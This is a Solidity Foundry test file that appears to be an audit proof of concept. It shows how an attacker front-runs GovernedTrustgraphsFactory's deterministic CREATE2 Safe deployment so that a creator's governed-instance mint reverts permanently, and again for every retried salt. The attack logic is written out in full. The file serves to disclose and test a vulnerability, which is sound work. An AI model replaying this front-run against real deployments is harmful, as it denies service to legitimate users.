// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import {GnosisSafe} from "@gnosis.pm/safe-contracts/GnosisSafe.sol";
import {GnosisSafeProxyFactory} from "@gnosis.pm/safe-contracts/proxies/GnosisSafeProxyFactory.sol";

import {GovernedTrustgraphsFactory} from "src/factory/GovernedTrustgraphsFactory.sol";
import {
    GovernedAuthorityDeployer,
    MerkleGovModuleDeployer,
    SignerSyncModuleDeployer
} from "src/factory/InstanceDeployers.sol";
import {TrustgraphsFactory} from "src/factory/TrustgraphsFactory.sol";
import {TrustgraphsFactoryBase} from "test/unit/factory/TrustgraphsFactoryBase.sol";

/// @title PashovAccess_GovernedSafeFrontRun
/// @notice `GovernedTrustgraphsFactory._createBootstrapSafe` deploys the DAO Safe through the
///         public `GnosisSafeProxyFactory` at a CREATE2 address that is a pure function of public
///         inputs: `(SAFE_SINGLETON, keccak(initializer), keccak(abi.encode(chainid, creator, name,
///         salt)))`, with a fixed initializer (`owners = [wrapper], threshold = 1`). Anyone can
///         mine that exact proxy first. The wrapper has no "adopt an existing Safe" branch, so the
///         victim's `createGovernedInstance` reverts inside the Safe proxy factory — permanently
///         for that (creator, name, salt), and repeatably for every new salt the victim tries.
contract PashovAccess_GovernedSafeFrontRunTest is TrustgraphsFactoryBase {
    GovernedTrustgraphsFactory internal governedFactory;
    GnosisSafe internal safeSingleton;
    GnosisSafeProxyFactory internal safeFactory;

    address internal creator = address(0xA11CE);
    address internal attacker = address(0xBADBAD);

    function setUp() public override {
        super.setUp();
        safeSingleton = new GnosisSafe();
        safeFactory = new GnosisSafeProxyFactory();
        governedFactory = new GovernedTrustgraphsFactory(
            factory,
            safeFactory,
            address(safeSingleton),
            new GovernedAuthorityDeployer(),
            new SignerSyncModuleDeployer(),
            new MerkleGovModuleDeployer()
        );
    }

    function _unpaidPolicy() internal pure returns (GovernedTrustgraphsFactory.InitialPolicy memory) {
        return GovernedTrustgraphsFactory.InitialPolicy({minPaidIntervalBlocks: 0, maxPerRootUsd: 0});
    }

    function _noSigner() internal pure returns (GovernedTrustgraphsFactory.SignerSyncConfig memory) {
        return GovernedTrustgraphsFactory.SignerSyncConfig({
            enabled: false,
            verifier: address(0),
            programVKey: bytes32(0),
            topN: 0,
            minThreshold: 0,
            targetThresholdBps: 0
        });
    }

    /// @dev The exact bytes `_createBootstrapSafe` builds — reproduced from public information.
    function _bootstrapInitializer() internal view returns (bytes memory) {
        address[] memory owners = new address[](1);
        owners[0] = address(governedFactory);
        return abi.encodeWithSignature(
            "setup(address[],uint256,address,bytes,address,address,uint256,address)",
            owners,
            1,
            address(0),
            bytes(""),
            address(0),
            address(0),
            0,
            address(0)
        );
    }

    function _bootstrapNonce(address creator_, string memory name, bytes32 salt) internal view returns (uint256) {
        return uint256(keccak256(abi.encode(block.chainid, creator_, name, salt)));
    }

    /// @notice Baseline: without interference the governed mint succeeds.
    function test_Baseline_GovernedCreationSucceeds() public {
        TrustgraphsFactory.CreateArgs memory args = _args("member-owned");
        args.salt = bytes32(uint256(7));

        vm.prank(creator);
        (, address safe,,) = governedFactory.createGovernedInstance(args, _unpaidPolicy(), _noSigner());
        assertTrue(safe != address(0), "safe created");
    }

    /// @notice The attack: the attacker deploys the SAME proxy (same singleton, same initializer,
    ///         same salt nonce) one transaction earlier. The victim's mint then reverts.
    function test_AttackerFrontRunsTheBootstrapSafeAndBricksCreation() public {
        string memory name = "member-owned";
        bytes32 salt = bytes32(uint256(7));

        // What the victim would have got.
        vm.prank(creator);
        address predicted = _predict(name, salt);

        // The attacker mines the identical proxy first. Public factory, public inputs, no auth.
        vm.prank(attacker);
        address squatted = address(
            safeFactory.createProxyWithNonce(
                address(safeSingleton), _bootstrapInitializer(), _bootstrapNonce(creator, name, salt)
            )
        );
        assertEq(squatted, predicted, "attacker occupied the address the wrapper had reserved");

        // The squatted Safe is owned by the wrapper and has no guard / no modules: the attacker
        // gains nothing directly. The damage is that the victim can never mint here again.
        assertTrue(GnosisSafe(payable(squatted)).isOwner(address(governedFactory)), "wrapper is the sole owner");

        TrustgraphsFactory.CreateArgs memory args = _args(name);
        args.salt = salt;

        vm.prank(creator);
        vm.expectRevert(bytes("Create2 call failed"));
        governedFactory.createGovernedInstance(args, _unpaidPolicy(), _noSigner());

        // ...and it stays bricked. Retrying is not a matter of gas price: the address is taken.
        vm.prank(creator);
        vm.expectRevert(bytes("Create2 call failed"));
        governedFactory.createGovernedInstance(args, _unpaidPolicy(), _noSigner());
    }

    /// @notice Every retry with a fresh salt is equally griefable, because the attacker reads the
    ///         new (name, salt) out of the pending transaction and re-runs the same one-call block.
    function test_EverySaltRetryIsGriefableAgain() public {
        string memory name = "member-owned";
        for (uint256 i = 1; i <= 3; i++) {
            bytes32 salt = bytes32(i);
            vm.prank(attacker);
            safeFactory.createProxyWithNonce(
                address(safeSingleton), _bootstrapInitializer(), _bootstrapNonce(creator, name, salt)
            );

            TrustgraphsFactory.CreateArgs memory args = _args(name);
            args.salt = salt;
            vm.prank(creator);
            vm.expectRevert(bytes("Create2 call failed"));
            governedFactory.createGovernedInstance(args, _unpaidPolicy(), _noSigner());
        }
    }

    /// @dev CREATE2 address of the Safe proxy, computed the way `GnosisSafeProxyFactory` does.
    function _predict(string memory name, bytes32 salt) internal returns (address) {
        bytes memory initializer = _bootstrapInitializer();
        bytes32 saltNonce = bytes32(_bootstrapNonce(creator, name, salt));
        bytes32 create2Salt = keccak256(abi.encodePacked(keccak256(initializer), uint256(saltNonce)));
        bytes memory deploymentData =
            abi.encodePacked(safeFactory.proxyCreationCode(), uint256(uint160(address(safeSingleton))));
        return address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(bytes1(0xff), address(safeFactory), create2Salt, keccak256(deploymentData))
                    )
                )
            )
        );
    }
}
